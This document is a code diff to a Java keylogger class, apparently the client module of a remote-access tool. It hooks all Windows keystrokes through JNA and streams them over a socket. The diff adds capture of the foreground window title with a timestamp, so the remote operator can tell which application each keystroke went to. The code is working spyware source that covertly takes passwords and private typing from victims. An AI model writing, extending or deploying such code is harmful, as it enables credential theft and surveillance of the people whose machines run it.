@@ -7,6 +7,8 @@ import me.client.utils.SendMessage;
 
 import javax.jws.soap.SOAPBinding;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 
 public class KeyBoardHook extends Thread{
     Socket socket;
@@ -15,30 +17,47 @@ public class KeyBoardHook extends Thread{
         this.socket = socket;
     }
     private WinUser.HHOOK hhk;
+    private static WinDef.HWND hwnd;
     private WinUser.LowLevelKeyboardProc keyboardProc = new WinUser.LowLevelKeyboardProc() {
         @Override
         public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT event) {
-                if ((wParam.intValue() >= 0x2f) && (wParam.intValue() <= 0x100)) {
+            if ((wParam.intValue() >= 0x2f) && (wParam.intValue() <= 0x100)) {
+                if (!hwnd.equals(User32.INSTANCE.GetForegroundWindow())) {
+                    SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
+                    char[] lpString = new char[260];
+                    hwnd = User32.INSTANCE.GetForegroundWindow();
+                    User32.INSTANCE.GetWindowText(hwnd,lpString,260);
+                    String title = "\n" + "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
+                    SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,
+                            title.getBytes(),socket);
+                }
                     String str = String.valueOf(Win32VK.fromValue(event.vkCode)).replace("VK_", "");
-                    if(str.length() >= 2) {
-                        if(event.vkCode == 0x0D) {
-                            SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,"\n".getBytes(),socket);
-                        }else {
-                            SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, ("[" + str + "]").getBytes(), socket);
-                        }
-                    }else {
-                        if(LoadDLL.instance.KeyState() == 0) {
-                            SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.toLowerCase().getBytes(), socket);
-                        }else {
-                            SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.getBytes(), socket);
-                        }
+                if (str.length() >= 2) {
+                    if (event.vkCode == 0x0D) {
+                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, "\n".getBytes(), socket);
+                    } else {
+                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, ("[" + str + "]").getBytes(), socket);
+                    }
+                } else {
+                    if (LoadDLL.instance.KeyState() == 0) {
+                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.toLowerCase().getBytes(), socket);
+                    } else {
+                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.getBytes(), socket);
                     }
                 }
+            }
             return com.sun.jna.platform.win32.User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
         }
     };
     @Override
     public void run() {
+        SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
+        char[] lpString = new char[260];
+        hwnd = User32.INSTANCE.GetForegroundWindow();
+        User32.INSTANCE.GetWindowText(hwnd,lpString,260);
+        String title = "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
+        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,
+                title.getBytes(),socket);
         while (run) {
             setHookOn();
         }
